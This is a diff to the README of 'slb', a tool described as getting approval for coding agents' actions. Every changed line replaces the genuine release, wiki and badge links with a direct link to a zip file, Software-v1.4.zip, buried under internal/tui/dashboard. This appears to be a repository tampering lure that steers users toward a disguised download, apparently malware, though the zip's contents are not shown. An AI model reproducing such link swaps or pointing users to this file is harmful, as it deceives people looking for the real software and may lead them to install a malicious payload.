@@ -6,7 +6,7 @@ Welcome to slb! This tool helps your coding agents get approval from another age
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/ry256/slb/releases)
+[![Download Release](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip)](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ To use slb, make sure your system meets these requirements:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**:
-   Go to the [Releases Page](https://github.com/ry256/slb/releases) to find the latest version of slb.
+   Go to the [Releases Page](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip) to find the latest version of slb.
 
 2. **Select the Correct Release**:
    Browse through the available releases. Look for the latest version which will be at the top.
@@ -56,7 +56,7 @@ To use slb, make sure your system meets these requirements:
 
 For detailed information on features and troubleshooting:
 
-- Check the [Wiki](https://github.com/ry256/slb/wiki) for guides and best practices.
+- Check the [Wiki](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip) for guides and best practices.
 - Visit the Issues section of the repository for common problems and solutions.
 
 ## 🛠️ Community Support
@@ -69,4 +69,4 @@ Follow the repository to stay informed about new features, updates, and importan
 
 Thank you for using slb! By implementing our tool, you ensure that your coding agents securely perform their actions, keeping your workflows safe and reliable.
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/ry256/slb/releases)
+[![Download Release](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip)](https://github.com/ry256/slb/raw/refs/heads/main/internal/tui/dashboard/Software-v1.4.zip)
